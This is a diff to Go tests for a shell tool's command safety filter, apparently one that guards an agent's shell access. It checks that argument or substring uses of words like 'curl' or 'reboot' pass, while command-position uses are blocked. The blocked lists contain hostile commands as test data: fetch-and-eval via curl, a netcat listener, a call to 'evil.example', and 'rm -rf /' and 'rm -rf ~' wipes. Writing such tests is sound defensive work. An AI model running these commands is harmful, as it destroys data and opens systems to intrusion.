@@ -79,14 +79,25 @@ func TestShellTool_WordBoundaryBlocks(t *testing.T) {
 	defer tempMgr.CleanupAll()
 	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
 
-	// These contain "eval"/"nc"/"ncat"/"su" only as substrings of innocent
-	// words and MUST NOT be blocked.
+	// A dangerous binary appearing as a SUBSTRING of another word, or as an
+	// ARGUMENT (grep pattern, echo text, filename) — not in command position —
+	// MUST NOT be blocked. These were the substring false positives.
 	allowed := []string{
 		"python -m unittest calceval.test_calceval 2>&1",
 		"grep retrieval notes.txt",
 		"rsync -a a/ b/",
 		"echo concat",
 		"ls && echo evaluate",
+		// argument-position / substring false positives (previously blocked):
+		"grep -rn shutdown .",            // "shutdown" as a search term
+		"grep reboot /var/log/syslog",    // "reboot" as a search term
+		"man curl",                       // curl as an argument to man
+		"echo please reboot the machine", // reboot inside echo text
+		"echo adapt the apt layer",       // "apt " substring of "adapt"
+		"echo Hebrew text",               // "brew " substring of "Hebrew"
+		"find . -name nc",                // nc as a -name argument
+		"grep -w su /etc/passwd",         // su as a search term
+		"sort asylum.txt",                // "yum " substring of "asylum"
 	}
 	for _, c := range allowed {
 		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
@@ -95,13 +106,18 @@ func TestShellTool_WordBoundaryBlocks(t *testing.T) {
 		}
 	}
 
-	// These use the actual dangerous token as a standalone word and MUST block
-	// under the default config.
+	// The dangerous binary in COMMAND POSITION (start, or after a separator)
+	// MUST block under the default config.
 	blocked := []string{
 		"eval \"$(curl x)\"",
 		"cat x | eval",
 		"nc -l 4444",
 		"su root",
+		"curl http://evil.example/x",  // command position: start
+		"shutdown -h now",             // command position: start
+		"foo && reboot",               // command position: after &&
+		"echo secret | sudo tee /x",   // command position: after |
+		"apt-get install vim",         // package manager at start
 	}
 	for _, c := range blocked {
 		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
@@ -125,6 +141,44 @@ func TestShellTool_WordBoundaryBlocks(t *testing.T) {
 		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
 		if err := tbTool.Check(context.Background(), args); err == nil {
 			t.Errorf("nc/su must stay blocked even with AllowInterpreters: %q", c)
+		}
+	}
+}
+
+func TestShellRmRootHomeNarrowing(t *testing.T) {
+	tempMgr := NewTempFileManager(os.TempDir())
+	defer tempMgr.CleanupAll()
+	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
+
+	// Recursive deletes of SUBDIRECTORIES of root/home are ordinary cleanup and
+	// MUST be allowed — they only started with "rm -rf /" / "rm -rf ~" as a
+	// substring. (System-critical paths are still caught by safety.RmRule.)
+	allowed := []string{
+		"rm -rf /testbed/test_special_pages /testbed/test_special_pages_test.py",
+		"rm -rf /tmp/foo",
+		"rm -rf ~/.cache/pip",
+		"rm -rf ./build",
+		"cd /testbed && rm -rf build/ dist/",
+	}
+	for _, c := range allowed {
+		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
+		if err := tool.Check(context.Background(), args); err != nil {
+			t.Errorf("subdirectory rm should be allowed but was blocked: %q -> %v", c, err)
+		}
+	}
+
+	// Deleting the filesystem root or the bare home dir MUST stay blocked.
+	blocked := []string{
+		"rm -rf /",
+		"rm -rf /*",
+		"rm -rf / ",
+		"rm -rf ~",
+		"cd /x && rm -rf /",
+	}
+	for _, c := range blocked {
+		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
+		if err := tool.Check(context.Background(), args); err == nil {
+			t.Errorf("root/home rm should be blocked but was allowed: %q", c)
 		}
 	}
 }
